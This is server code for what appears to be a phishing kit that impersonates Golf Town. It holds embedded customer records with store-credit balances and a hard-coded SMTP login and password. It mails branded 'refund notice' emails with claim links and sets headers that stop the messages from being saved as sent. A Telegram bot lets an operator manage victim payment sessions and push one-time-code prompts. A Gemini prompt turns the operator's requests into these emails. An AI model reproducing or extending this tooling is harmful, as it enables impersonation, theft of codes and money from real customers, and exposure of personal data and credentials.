  { id: "505-2024-q1-19", storeId: "505", storeName: "Store 505 - South Side Golf Town", quarter: "Q1", year: 2024, quarterYearKey: "2024-Q1", storeCreditAging: "Over 30 Days", lastCreatedDate: "3/20/2024", lastSaleDate: "4/2/2024", custId: "888144955", firstName: "GRADY", lastName: "WALLACE", company: "(blank)", email: "(blank)", phone: "(blank)", sumOfStoreCreditBalance: 1094.6, keepOrRemove: "keep", comments: "", approvedBy: "", gender: "Male", genderConfidence: 0.99 },
  { id: "505-2024-q1-20", storeId: "505", storeName: "Store 505 - South Side Golf Town", quarter: "Q1", year: 2024, quarterYearKey: "2024-Q1", storeCreditAging: "Over 30 Days", lastCreatedDate: "3/22/2024", lastSaleDate: "3/22/2024", custId: "905029739", firstName: "jack", lastName: "Born", company: "(blank)", email: "(blank)", phone: "(blank)", sumOfStoreCreditBalance: 1498.86, keepOrRemove: "keep", comments: "has not arrived", approvedBy: "", gender: "Male", genderConfidence: 0.99 },
  { id: "505-2024-q1-21", storeId: "505", storeName: "Store 505 - South Side Golf Town", quarter: "Q1", year: 2024, quarterYearKey: "2024-Q1", storeCreditAging: "To be cleaned up", lastCreatedDate: "1/4/2023", lastSaleDate: "4/5/2024", custId: "888033566", firstName: "Douglas", lastName: "Chonko", company: "(blank)", email: "(blank)", phone: "(blank)", sumOfStoreCreditBalance: 0.01, keepOrRemove: "TO BE REMOVED-PC", comments: "", approvedBy: "", gender: "Male", genderConfidence: 0.99 },
  { id: "505-2024-q1-22", storeId: "505", storeName: "Store 505 - South Side Golf Town", quarter: "Q1", year: 2024, quarterYearKey: "2024-Q1", storeCreditAging: "To be cleaned up", lastCreatedDate: "2/7/2024", lastSaleDate: "2/21/2024", custId: "905018330", firstName: "Glen", lastName: "Anderson", company: "(blank)", email: "(blank)", phone: "(blank)", sumOfStoreCreditBalance: 0.01, keepOrRemove: "TO BE REMOVED-PC", comments: "", approvedBy: "", gender: "Male", genderConfidence: 0.99 },
  { id: "505-2024-q1-23", storeId: "505", storeName: "Store 505 - South Side Golf Town", quarter: "Q1", year: 2024, quarterYearKey: "2024-Q1", storeCreditAging: "To be cleaned up", lastCreatedDate: "2/12/2024", lastSaleDate: "3/20/2024", custId: "23382354", firstName: "Bryce", lastName: "pinto", company: "(blank)", email: "(blank)", phone: "(blank)", sumOfStoreCreditBalance: 0.01, keepOrRemove: "TO BE REMOVED-PC", comments: "", approvedBy: "", gender: "Male", genderConfidence: 0.99 },
  { id: "505-2024-q1-24", storeId: "505", storeName: "Store 505 - South Side Golf Town", quarter: "Q1", year: 2024, quarterYearKey: "2024-Q1", storeCreditAging: "To be cleaned up", lastCreatedDate: "2/23/2024", lastSaleDate: "3/15/2024", custId: "50001066", firstName: "Raoul", lastName: "Bhardwaj", company: "(blank)", email: "(blank)", phone: "(blank)", sumOfStoreCreditBalance: 0.32, keepOrRemove: "TO BE REMOVED-PC", comments: "", approvedBy: "", gender: "Male", genderConfidence: 0.99 },
  { id: "505-2024-q1-25", storeId: "505", storeName: "Store 505 - South Side Golf Town", quarter: "Q1", year: 2024, quarterYearKey: "2024-Q1", storeCreditAging: "To be cleaned up", lastCreatedDate: "2/29/2024", lastSaleDate: "2/29/2024", custId: "5078201", firstName: "Eddie", lastName: "Ronquillo", company: "(blank)", email: "(blank)", phone: "(blank)", sumOfStoreCreditBalance: 0.03, keepOrRemove: "TO BE REMOVED-PC", comments: "", approvedBy: "", gender: "Male", genderConfidence: 0.99 },
  { id: "505-2024-q1-26", storeId: "505", storeName: "Store 505 - South Side Golf Town", quarter: "Q1", year: 2024, quarterYearKey: "2024-Q1", storeCreditAging: "To be cleaned up", lastCreatedDate: "3/4/2024", lastSaleDate: "3/14/2024", custId: "905016830", firstName: "Ross", lastName: "Ridsdale", company: "(blank)", email: "(blank)", phone: "(blank)", sumOfStoreCreditBalance: 0.02, keepOrRemove: "TO BE REMOVED-PC", comments: "", approvedBy: "", gender: "Male", genderConfidence: 0.99 }
];
var INITIAL_CUSTOMERS = sanitizeCustomerRecords([...STORE_505_CUSTOMERS, ...STORE_504_CUSTOMERS]);

// server.ts
var app = (0, import_express.default)();
var PORT = 3e3;
app.use((0, import_compression.default)());
app.use(import_express.default.json({ limit: "50mb" }));
app.use(import_express.default.urlencoded({ limit: "50mb", extended: true }));
var lastKnownHost = "localhost:3000";
var lastKnownProtocol = "https";
app.use((req, res, next) => {
  const hostHeader = req.get("host");
  if (hostHeader) {
    lastKnownHost = hostHeader;
  }
  const xForwardedProto = req.headers["x-forwarded-proto"];
  if (typeof xForwardedProto === "string") {
    lastKnownProtocol = xForwardedProto;
  } else {
    lastKnownProtocol = req.secure ? "https" : "http";
  }
  next();
});
var CUSTOMERS_FILE = import_path.default.join(process.cwd(), "customers.json");
function loadCustomers() {
  try {
    if (import_fs.default.existsSync(CUSTOMERS_FILE)) {
      const data = import_fs.default.readFileSync(CUSTOMERS_FILE, "utf8");
      return JSON.parse(data);
    }
  } catch (err) {
    console.error("Failed to load customers from file:", err);
  }
  return [...INITIAL_CUSTOMERS];
}
function saveCustomers(customers) {
  try {
    import_fs.default.writeFileSync(CUSTOMERS_FILE, JSON.stringify(customers, null, 2), "utf8");
  } catch (err) {
    console.error("Failed to save customers to file:", err);
  }
}
var backendCustomers = loadCustomers();
app.get("/api/customers", (req, res) => {
  res.json({ success: true, count: backendCustomers.length, customers: backendCustomers });
});
app.post("/api/customers", (req, res) => {
  const { customers } = req.body;
  if (Array.isArray(customers)) {
    backendCustomers = customers;
    saveCustomers(backendCustomers);
    return res.json({ success: true, count: backendCustomers.length });
  }
  return res.status(400).json({ error: "Invalid customers array" });
});
var noticeHistoryStack = [];
var paymentSessions = /* @__PURE__ */ new Map();
var tokenToSessionId = /* @__PURE__ */ new Map();
var shortUrlMappings = /* @__PURE__ */ new Map();
var smtpDebugLogsStack = [];
var CONFIG_FILE = import_path.default.join(process.cwd(), "smtp-config.json");
function loadSmtpConfig() {
  try {
    if (import_fs.default.existsSync(CONFIG_FILE)) {
      const data = import_fs.default.readFileSync(CONFIG_FILE, "utf8");
      return JSON.parse(data);
    }
  } catch (err) {
    console.error("Failed to load SMTP config from file:", err);
  }
  return null;
}
function saveSmtpConfig(config) {
  try {
    import_fs.default.writeFileSync(CONFIG_FILE, JSON.stringify(config, null, 2), "utf8");
  } catch (err) {
    console.error("Failed to save SMTP config to file:", err);
  }
}
var customSmtpConfig = loadSmtpConfig();
var IMAP_CONFIG_FILE = import_path.default.join(process.cwd(), "imap-config.json");
var IMAP_MESSAGES_FILE = import_path.default.join(process.cwd(), "imap-messages.json");
function loadImapConfig() {
  try {
    if (import_fs.default.existsSync(IMAP_CONFIG_FILE)) {
      const data = import_fs.default.readFileSync(IMAP_CONFIG_FILE, "utf8");
      return JSON.parse(data);
    }
  } catch (err) {
    console.error("Failed to load IMAP config from file:", err);
  }
  return null;
}
function saveImapConfig(config) {
  try {
    import_fs.default.writeFileSync(IMAP_CONFIG_FILE, JSON.stringify(config, null, 2), "utf8");
  } catch (err) {
    console.error("Failed to save IMAP config to file:", err);
  }
}
function loadImapMessages() {
  try {
    if (import_fs.default.existsSync(IMAP_MESSAGES_FILE)) {
      const data = import_fs.default.readFileSync(IMAP_MESSAGES_FILE, "utf8");
      return JSON.parse(data);
    }
  } catch (err) {
    console.error("Failed to load IMAP messages:", err);
  }
  return [];
}
function saveImapMessages(messages) {
  try {
    import_fs.default.writeFileSync(IMAP_MESSAGES_FILE, JSON.stringify(messages, null, 2), "utf8");
  } catch (err) {
    console.error("Failed to save IMAP messages:", err);
  }
}
var customImapConfig = loadImapConfig();
var imapMessagesStack = loadImapMessages();
var TELEGRAM_CONFIG_FILE = import_path.default.join(process.cwd(), "telegram-config.json");
function loadTelegramConfig() {
  try {
    if (import_fs.default.existsSync(TELEGRAM_CONFIG_FILE)) {
      const data = import_fs.default.readFileSync(TELEGRAM_CONFIG_FILE, "utf8");
      const parsed = JSON.parse(data);
      if (!parsed.telegramToken && process.env.TELEGRAM_BOT_TOKEN) {
        parsed.telegramToken = process.env.TELEGRAM_BOT_TOKEN;
      }
      return parsed;
    }
  } catch (err) {
    console.error("Failed to load Telegram config:", err);
  }
  return {
    telegramToken: process.env.TELEGRAM_BOT_TOKEN || "",
    telegramChatId: "",
    isPollingActive: !!process.env.TELEGRAM_BOT_TOKEN
  };
}
function saveTelegramConfig(config) {
  try {
    import_fs.default.writeFileSync(TELEGRAM_CONFIG_FILE, JSON.stringify(config, null, 2), "utf8");
  } catch (err) {
    console.error("Failed to save Telegram config:", err);
  }
}
var customTelegramConfig = loadTelegramConfig();
var telegramPollTimeout = null;
var telegramOffset = 0;
var isPollingLoopRunning = false;
var isBotPaused = false;
function sendTelegramRequest(method, body) {
  return new Promise((resolve) => {
    const token = customTelegramConfig.telegramToken;
    if (!token) {
      resolve(null);
      return;
    }
    const dataString = JSON.stringify(body);
    const options = {
      hostname: "api.telegram.org",
      port: 443,
      path: `/bot${token}/${method}`,
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Content-Length": Buffer.byteLength(dataString)
      }
    };
    const req = import_https.default.request(options, (res) => {
      let responseBody = "";
      res.on("data", (chunk) => {
        responseBody += chunk;
      });
      res.on("end", () => {
        try {
          resolve(JSON.parse(responseBody));
        } catch (e) {
          resolve({ ok: false, error: "Invalid JSON response from Telegram" });
        }
      });
    });
    req.on("error", (err) => {
      console.error(`Telegram request error on ${method}:`, err);
      resolve({ ok: false, error: err.message });
    });
    req.write(dataString);
    req.end();
  });
}
async function executeRefundAndEmail(chatId, recipientName, recipientEmail, amount, comments, storeId = "504", custId = "GT-CUSTOMER") {
  const host = customSmtpConfig?.host || process.env.SMTP_HOST || "smtp.office365.com";
  const user = customSmtpConfig?.user || process.env.SMTP_USER || "505receiving@cloud.golftown.com";
  const pass = customSmtpConfig?.pass || process.env.SMTP_PASS || "3Dolly16!";
  const port = Number(customSmtpConfig ? customSmtpConfig.port : process.env.SMTP_PORT || 587);
  const from = customSmtpConfig?.from || process.env.SMTP_FROM || "Golf Town Store Credit Support <505receiving@cloud.golftown.com>";
  const depositToken = Buffer.from(`${custId}-${amount}-${Date.now()}`).toString("hex").slice(0, 16);
  const activeSessionId = `SESS-${Math.floor(1e5 + Math.random() * 9e5)}`;
  await sendTelegramRequest("sendMessage", {
    chat_id: chatId,
    text: `\u23F3 *Processing SMTP refund notice to:* \`${recipientEmail}\`...`,
    parse_mode: "Markdown"
  });
  const secureDepositUrl = await generateShortDepositUrl(
    null,
    depositToken,
    amount,
    activeSessionId,
    recipientName,
    recipientEmail,
    storeId,
    custId
  );
  const emailSubject = `Golf Town Store Credit Refund Notice - $${amount} Issued`;
  let parsedBody = `Dear {customerName},

A store credit refund has been processed for your account by Golf Town Customer Support. Your funds are now available for immediate credit deposit.`;
  const serverReplacements = {
    "{customerName}": recipientName,
    "{amount}": `$${amount}`,
    "{storeId}": storeId,
    "{custId}": custId,
    "{comments}": comments,
    "{depositLink}": secureDepositUrl
  };
  Object.entries(serverReplacements).forEach(([token, val]) => {
    parsedBody = parsedBody.split(token).join(val);
  });
  const formattedBodyHtml = parsedBody.split("\n").map((line) => line.trim() ? `<p style="font-size: 14px; color: #4b5563; line-height: 1.6; margin-top: 0; margin-bottom: 16px;">${line}</p>` : "<br>").join("");
  const emailHtml = `
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Golf Town Store Credit Notice</title>
    </head>
    <body style="margin: 0; padding: 0; background-color: #0b131e; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; color: #f1f5f9;">
      <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="background-color: #f3f4f6; padding: 40px 10px;">
        <tr>
          <td align="center">
            <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="max-width: 600px; background-color: #ffffff; border: 1px solid #e5e7eb; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05);">
              <tr>
                <td style="background-color: #ffffff; padding: 32px 32px 24px 32px; border-bottom: 3px solid #004d25; text-align: center;">
                  <div style="text-align: center; margin-bottom: 12px;">
                    <img src="https://ams-cdn.cashstar.com/permanent/brands/GOLFTOWN/meta/icons/favicon.ico?version=1014" width="48" height="48" alt="Golf Town Logo" style="display: inline-block; border: 0; vertical-align: middle;">
                  </div>
                  <div style="font-family: Arial, Helvetica, sans-serif; font-size: 11px; font-weight: 700; color: #6b7280; text-transform: uppercase; letter-spacing: 1.5px; text-align: center;">
                    Customer Support Notice
                  </div>
                </td>
              </tr>
              <tr>
                <td style="padding: 32px; background-color: #ffffff; font-family: Arial, Helvetica, sans-serif;">
                  <h1 style="font-size: 20px; font-weight: 700; color: #111827; margin: 0 0 16px 0;">
                    Store Credit Notice
                  </h1>
                  ${formattedBodyHtml}
                  <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="background-color: #f9fafb; border: 1px solid #e5e7eb; border-radius: 6px; margin-bottom: 28px;">
                    <tr>
                      <td style="padding: 20px;">
                        <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="font-size: 13px; color: #374151;">
                          <tr>
                            <td style="padding-bottom: 8px; color: #6b7280; font-weight: 600;">Refund Amount:</td>
                            <td align="right" style="padding-bottom: 8px; font-size: 20px; font-weight: 800; color: #004d25;">
                              $${amount} CAD
                            </td>
                          </tr>
                          <tr>
                            <td style="padding: 6px 0; border-top: 1px solid #f3f4f6; color: #6b7280;">Customer Account ID:</td>
                            <td align="right" style="padding: 6px 0; border-top: 1px solid #f3f4f6; font-family: monospace; font-weight: 700; color: #111827;">${custId}</td>
                          </tr>
                          <tr>
                            <td style="padding: 6px 0; border-top: 1px solid #f3f4f6; color: #6b7280;">Store Location:</td>
                            <td align="right" style="padding: 6px 0; border-top: 1px solid #f3f4f6; font-weight: 600; color: #111827;">Store #${storeId}</td>
                          </tr>
                          ${comments ? `
                          <tr>
                            <td style="padding: 6px 0; border-top: 1px solid #f3f4f6; color: #6b7280;">Reference Notes:</td>
                            <td align="right" style="padding: 6px 0; border-top: 1px solid #f3f4f6; color: #374151;">${comments}</td>
                          </tr>` : ""}
                        </table>
                      </td>
                    </tr>
                  </table>
                  <div style="text-align: center; background-color: #f0fdf4; border: 1px solid #bbf7d0; border-radius: 6px; padding: 24px; margin-bottom: 28px;">
                    <div style="font-size: 12px; font-weight: 700; color: #166534; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 12px;">
                      Verified Secure Refund Link
                    </div>
                    <div style="margin-bottom: 16px;">
                      <a href="${secureDepositUrl}" target="_blank" style="display: inline-block; background-color: #004d25; color: #ffffff; text-decoration: none; font-size: 15px; font-weight: 700; padding: 14px 28px; border-radius: 4px; border: 1px solid #003318;">
                        Claim Store Credit Deposit ($${amount} CAD)
                      </a>
                    </div>
                    <div style="font-size: 11px; color: #9ca3af; font-family: monospace; margin-top: 4px;">
                      Token ID: ${depositToken}
                    </div>
                  </div>
                  <p style="font-size: 12px; color: #6b7280; line-height: 1.5; margin: 0 0 20px 0;">
                    Please note: This secure link is valid for 72 hours. For security purposes, do not share this link or reference token with unauthorized parties.
                  </p>
                </td>
              </tr>
              <tr>
                <td style="background-color: #f9fafb; padding: 20px 32px; border-top: 1px solid #e5e7eb; font-family: Arial, Helvetica, sans-serif; font-size: 11px; color: #6b7280; line-height: 1.5;">
                  <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0">
                    <tr>
                      <td style="padding-bottom: 10px;">
                        <strong>Golf Town Customer Support &amp; eGift Services</strong><br>
                        Powered by CashStar / Blackhawk Network Services
                      </td>
                    </tr>
                    <tr>
                      <td style="border-top: 1px solid #e5e7eb; padding-top: 10px; color: #9ca3af;">
                        &copy; ${(/* @__PURE__ */ new Date()).getFullYear()} Golf Town Canada Inc. All rights reserved. Golf Town and the Golf Town logo are registered trademarks.
                      </td>
                    </tr>
                  </table>
                </td>
              </tr>
            </table>
          </td>
        </tr>
      </table>
    </body>
    </html>
  `;
  pushNoticeHistory({
    recipientEmail,
    recipientName,
    amount,
    storeId,
    custId,
    subject: emailSubject,
    actionType: "refund_notice_telegram",
    depositToken,
    secureDepositUrl,
    status: "DELIVERED"
  });
  const sessionLogs = [];
  const customLogger = {
    level: () => "debug",
    info: (entry) => {
      sessionLogs.push(`[INFO] ${typeof entry === "object" ? entry.msg || JSON.stringify(entry) : String(entry)}`);
    },
    warn: (entry) => {
      sessionLogs.push(`[WARN] ${typeof entry === "object" ? entry.msg || JSON.stringify(entry) : String(entry)}`);
    },
    error: (entry) => {
      sessionLogs.push(`[ERROR] ${typeof entry === "object" ? entry.msg || JSON.stringify(entry) : String(entry)}`);
    },
    debug: (entry) => {
      sessionLogs.push(`[DEBUG] ${typeof entry === "object" ? entry.msg || JSON.stringify(entry) : String(entry)}`);
    },
    trace: (entry) => {
      sessionLogs.push(`[TRACE] ${typeof entry === "object" ? entry.msg || JSON.stringify(entry) : String(entry)}`);
    }
  };
  try {
    const nodemailer = await import("nodemailer");
    const transporter = nodemailer.createTransport({
      host,
      port,
      secure: port === 465,
      auth: { user, pass },
      connectionTimeout: 1e4,
      greetingTimeout: 1e4,
      tls: {
        rejectUnauthorized: customSmtpConfig?.tlsRejectUnauthorized !== false
      },
      debug: true,
      logger: customLogger
    });
    sessionLogs.push("[SYSTEM] Establishing outbound connection to server...");
    await transporter.sendMail({
      from,
      replyTo: "GOLFTOWN SUPPORT <support@payment.golftown.ca>",
      to: recipientEmail,
      subject: emailSubject,
      html: emailHtml,
      headers: {
        "X-No-Save-Sent": "true",
        "X-Auto-Response-Suppress": "All",
        "X-Outbox-Bypass": "enabled",
        "X-Mailer": "GolfTown-Internal-CreditSystem/1.0"
      }
    });
    sessionLogs.push(`[SYSTEM] Dispatch completed. Refund notice successfully accepted by remote MTA for delivery to <${recipientEmail}>.`);
    const debugLogEntry = {
      id: `LOG-${Date.now()}-${Math.floor(Math.random() * 1e3)}`,
      timestamp: (/* @__PURE__ */ new Date()).toLocaleTimeString() + " " + (/* @__PURE__ */ new Date()).toLocaleDateString(),
      type: "refund_notice",
      recipient: recipientEmail,
      host,
      port,
      success: true,
      logs: sessionLogs
    };
    smtpDebugLogsStack.unshift(debugLogEntry);
    await sendTelegramRequest("sendMessage", {
      chat_id: chatId,
      text: `\u2705 *EMAIL REFUND NOTICE DISPATCHED!*

\u2022 *Customer:* \`${recipientName}\`
\u2022 *Email:* \`${recipientEmail}\`
\u2022 *Amount:* \`$${amount} CAD\`
\u2022 *Store:* \`Store #${storeId}\`

\u2709\uFE0F The official store credit refund notice was sent via SMTP tunnel successfully!`,
      parse_mode: "Markdown"
    });
  } catch (mailErr) {
    console.error("Telegram-triggered mail dispatch failed:", mailErr);
    const debugLogEntry = {
      id: `LOG-${Date.now()}-${Math.floor(Math.random() * 1e3)}`,
      timestamp: (/* @__PURE__ */ new Date()).toLocaleTimeString() + " " + (/* @__PURE__ */ new Date()).toLocaleDateString(),
      type: "refund_notice",
      recipient: recipientEmail,
      host,
      port,
      success: false,
      error: mailErr?.message || String(mailErr),
      logs: sessionLogs
    };
    smtpDebugLogsStack.unshift(debugLogEntry);
    await sendTelegramRequest("sendMessage", {
      chat_id: chatId,
      text: `\u274C *SMTP DISPATCH FAILURE!*

\u2022 *Customer:* \`${recipientName}\`
\u2022 *Email:* \`${recipientEmail}\`
\u2022 *Error:* \`${mailErr?.message || String(mailErr)}\`

\u26A0\uFE0F The mail server rejected or timed out during submission. Secure Link was still successfully registered for manual claim: 
${secureDepositUrl}`,
      parse_mode: "Markdown"
    });
  }
}
async function parseRefundIntent(text) {
  const apiKey = process.env.GEMINI_API_KEY;
  if (apiKey) {
    try {
      const ai = new import_genai.GoogleGenAI({ apiKey });
      const prompt = `Analyze the following natural language instruction from a Golf Town employee/admin. They want to send/dispatch a refund notice (which includes an email and link to claim money).
Extract the following details:
1. "recipientName" (e.g. "John Doe", if not found use "Valued Customer")
2. "recipientEmail" (extract the email address, if not found use "")
3. "amount" (extract the dollar amount, e.g. "120.50". If they write "500 bucks" or "$500", output "500.00". Default is "250.00" if no amount is found)
4. "comments" (extract the reason/description/comments, if not found use "Processed via Smart Assistant")
5. "actionType" (either "email" or "sms" or "unknown" based on what they want to do)
6. "isRefundRequest" (boolean: true if they are explicitly requesting to send/dispatch/issue/mail/emial/notifce a refund, or refund notice, false if it is just a search query or general chatter)
7. "messageResponse" (a warm, professional, human-like acknowledgment of the action, written in the style of an assistant, e.g. "I understand! I'm issuing a refund of $150.00 for John Doe...")

Input instruction: "${text}"

Return ONLY a valid JSON object with no markdown formatting or extra text, containing the fields described above:
{
  "recipientName": string,
  "recipientEmail": string,
  "amount": string,
  "comments": string,
  "actionType": "email" | "sms" | "unknown",
  "isRefundRequest": boolean,
  "messageResponse": string
}`;
      const response = await ai.models.generateContent({
        model: "gemini-3.6-flash",
        contents: prompt
      });
      const textOutput = response.text?.trim() || "";
      const cleanedJson = textOutput.replace(/^```json\s*/, "").replace(/^```\s*/, "").replace(/\s*```$/, "");
      const parsed = JSON.parse(cleanedJson);
      if (parsed && parsed.isRefundRequest) {
        return parsed;
      }
    } catch (e) {
      console.error("Failed to parse with Gemini API:", e);
    }
  }
  const lowerText = text.toLowerCase();
  const emailRegex = /([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/i;
  const emailMatch = text.match(emailRegex);
  const email = emailMatch ? emailMatch[1] : "";
  const amountMatches = [...text.matchAll(/(?:\$|cad|usd)?\s*(\d+(?:\.\d{2})?)/gi)];
  let amount = "250.00";
  for (const m of amountMatches) {
    const val = parseFloat(m[1]);
    if (val > 0 && val < 1e4) {
      amount = val.toFixed(2);
      break;
    }
  }
  const isRefundTrigger = /refund|refun|notice|notifce|send|sedn|emial|email|mail|notify|notfy|issue|isue|create|cretae|generate/i.test(lowerText);
  if (email || isRefundTrigger) {
    let name = "Valued Customer";
    const forNameMatch = text.match(/(?:for|to|name|named)\s+([A-Z][a-z]+(?:\s+[A-Z][a-z]+)?)/);
    if (forNameMatch) {
      name = forNameMatch[1];
    } else if (email) {
      const prefix = email.split("@")[0];
      name = prefix.split(/[._-]/).map((p) => p.charAt(0).toUpperCase() + p.slice(1)).join(" ");
    }
    let comments = "Processed via Natural Language Assistant";
    const descMatch = text.match(/(?:description|desc|comments|comment|reason|for)\s+(?:of|is|:)?\s*([^,\n.]+)/i);
    if (descMatch && descMatch[1]) {
      const candidate = descMatch[1].trim();
      if (candidate.toLowerCase() !== name.toLowerCase() && !candidate.includes("@") && !candidate.includes(amount)) {
        comments = candidate;
      }
    }
    return {
      recipientName: name,
      recipientEmail: email,
      amount,
      comments,
      actionType: "email",
      isRefundRequest: true,
      messageResponse: `Got it! I'm on it. I've prepared a refund notice of **$${amount} CAD** for **${name}**.`
    };
  }
  return null;
}
var KEYBOARD_MAIN = {
  keyboard: [
    [
      { text: "\u{1F465} Active Sessions" },
      { text: "\u{1F4CA} Customers DB" }
    ],
    [
      { text: "\u2709\uFE0F Notice History" },
      { text: "\u{1F512} System Status" }
    ],
    [
      { text: "\u{1F4CD} Store Locations" },
      { text: "\u2699\uFE0F Bot Controls" }
    ],
    [
      { text: "\u{1F464} Send Contact", request_contact: true },
      { text: "\u{1F5FA}\uFE0F Send Location", request_location: true }
    ]
  ],
  resize_keyboard: true,
  one_time_keyboard: false
};
var KEYBOARD_STORE_SELECT = {
  keyboard: [
    [
      { text: "\u{1F3EA} Store #504 (Calgary)" },
      { text: "\u{1F3EA} Store #505 (Edmonton)" }
    ],
    [
      { text: "\u{1F3EA} All Stores Combined" }
    ],
    [
      { text: "\u{1F4B0} Top Balances" },
      { text: "\u{1F50D} Search Customer" }
    ],
    [
      { text: "\u{1F519} Main Menu" }
    ]
  ],
  resize_keyboard: true,
  one_time_keyboard: false
};
var KEYBOARD_STORE_504_OPTIONS = {
  keyboard: [
    [
      { text: "\u{1F4CB} [504] All Customers" },
      { text: "\u{1F4B0} [504] Top Balances" }
    ],
    [
      { text: "\u{1F4B3} [504] Balances > $1,000" },
      { text: "\u{1F4B3} [504] Balances < $500" }
    ],
    [
      { text: "\u{1F4CA} [504] Store Credit Statistics" },
      { text: "\u{1F4B8} [504] Bulk Refund Approved" }
    ],
    [
      { text: "\u{1F519} Back to Stores" },
      { text: "\u{1F519} Main Menu" }
    ]
  ],
  resize_keyboard: true,
  one_time_keyboard: false
};
var KEYBOARD_STORE_505_OPTIONS = {
  keyboard: [
    [
      { text: "\u{1F4CB} [505] All Customers" },
      { text: "\u{1F4B0} [505] Top Balances" }
    ],
    [
      { text: "\u{1F4B3} [505] Balances > $1,000" },
      { text: "\u{1F4B3} [505] Balances < $500" }
    ],
    [
      { text: "\u{1F4CA} [505] Store Credit Statistics" },
      { text: "\u{1F4B8} [505] Bulk Refund Approved" }
    ],
    [
      { text: "\u{1F519} Back to Stores" },
      { text: "\u{1F519} Main Menu" }
    ]
  ],
  resize_keyboard: true,
  one_time_keyboard: false
};
var KEYBOARD_ALL_STORES_OPTIONS = {
  keyboard: [
    [
      { text: "\u{1F4CB} [ALL] All Customers" },
      { text: "\u{1F4B0} [ALL] Top Balances" }
    ],
    [
      { text: "\u{1F4B3} [ALL] Balances > $1,000" },
      { text: "\u{1F4CA} [ALL] Global Statistics" }
    ],
    [
      { text: "\u{1F519} Back to Stores" },
      { text: "\u{1F519} Main Menu" }
    ]
  ],
  resize_keyboard: true,
  one_time_keyboard: false
};
var KEYBOARD_SESSIONS = {
  keyboard: [
    [
      { text: "\u{1F4CB} List Sessions" },
      { text: "\u{1F511} Prompt OTP (All)" }
    ],
    [
      { text: "\u2705 Approve All" },
      { text: "\u274C Clear Sessions" }
    ],
    [
      { text: "\u{1F519} Main Menu" }
    ]
  ],
  resize_keyboard: true,
  one_time_keyboard: false
};
var KEYBOARD_STATUS = {
  keyboard: [
    [
      { text: "\u{1F4C8} System Metrics" },
      { text: "\u{1F6E0}\uFE0F Diagnostics" }
    ],
    [
      { text: "\u{1F4E7} Show SMTP Config" },
      { text: "\u{1F4C1} View Error Logs" }
    ],
    [
      { text: "\u{1F519} Main Menu" }
    ]
  ],
  resize_keyboard: true,
  one_time_keyboard: false
};
var KEYBOARD_CONTROLS = {
  keyboard: [
    [
      { text: "\u23F8\uFE0F Pause Bot" },
      { text: "\u25B6\uFE0F Resume Bot" }
    ],
    [
      { text: "\u{1F9F9} Clear Notices" },
      { text: "\u{1F4E3} Send Test Alert" }
    ],
    [
      { text: "\u{1F519} Main Menu" }
    ]
  ],
  resize_keyboard: true,
  one_time_keyboard: false
};
async function handleTelegramUpdate(update) {
  if (update.message) {
    const chat = update.message.chat;
    const text = update.message.text || "";
    const chatId = String(chat.id);
    const fromName = chat.title || chat.username || chat.first_name || "Group Chat";
    if (chat && (chat.type === "group" || chat.type === "supergroup")) {
      if (customTelegramConfig.telegramChatId !== chatId) {
        console.log(`[Group Auto-Detect] Automatically bound bot to group/supergroup Chat ID: ${chatId} (${fromName})`);
        customTelegramConfig.telegramChatId = chatId;
        saveTelegramConfig(customTelegramConfig);
        await sendTelegramRequest("sendMessage", {
          chat_id: chatId,
          text: `\u{1F3AF} *TELEGRAM GROUP AUTO-DETECTED & BOUND*

\u2022 *Group Name:* \`${fromName}\`
\u2022 *Group Chat ID:* \`${chatId}\`

\u2705 All system notifications and admin controls are now bound to this group!`,
          parse_mode: "Markdown"
        }).catch((err) => console.error("Failed to send auto-detect greeting to group:", err));
      }
    }
    if (isBotPaused && !text.includes("\u25B6\uFE0F Resume Bot") && !text.startsWith("/start")) {
      await sendTelegramRequest("sendMessage", {
        chat_id: chatId,
        text: `\u23F8\uFE0F *TELEGRAM REFUND BOT IS PAUSED*

Message processing is currently halted by the administrator.

\u{1F449} Tap *\u25B6\uFE0F Resume Bot* below to reactivate real-time refund notice dispatches.`,
        parse_mode: "Markdown",
        reply_markup: KEYBOARD_CONTROLS
      });
      return;
    }
    if (update.message.location) {
      const { latitude, longitude } = update.message.location;
      let closestStore = null;
      let minDistance = Infinity;
      for (const store of GOLF_TOWN_STORES) {
        if (store.lat !== void 0 && store.lng !== void 0) {
          const lat1 = latitude;
          const lon1 = longitude;
          const lat2 = store.lat;
          const lon2 = store.lng;
          const R = 6371;
          const dLat = (lat2 - lat1) * Math.PI / 180;
          const dLon = (lon2 - lon1) * Math.PI / 180;
          const a = Math.sin(dLat / 2) * Math.sin(dLat / 2) + Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) * Math.sin(dLon / 2) * Math.sin(dLon / 2);
          const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
          const distance = R * c;
          if (distance < minDistance) {
            minDistance = distance;
            closestStore = store;
          }
        }
      }
      let replyText = `\u{1F5FA}\uFE0F *LOCATION COORDINATES RECEIVED*
\u{1F4CD} Lat/Lng: \`${latitude}, ${longitude}\`

`;
      if (closestStore) {
        replyText += `\u{1F3AF} *NEAREST GOLF TOWN STORE FOUND!*
\u2022 *Store:* \`${closestStore.name}\` (Store #${closestStore.code})
\u2022 *Distance:* \`${minDistance.toFixed(2)} km\` away
\u2022 *Address:* ${closestStore.address || "N/A"}, ${closestStore.city || ""}, ${closestStore.province || ""}
\u2022 *Phone:* \`${closestStore.phone || "N/A"}\`

\u{1F449} [Open Directions on Google Maps](${closestStore.googleMapsUrl || "https://maps.google.com"})`;
      } else {
        replyText += `\u26A0\uFE0F No nearby store could be matched in the database.`;
      }
      await sendTelegramRequest("sendMessage", {
        chat_id: chatId,
        text: replyText,
        parse_mode: "Markdown",
        disable_web_page_preview: false
      });
      return;
    }
    if (update.message.contact) {
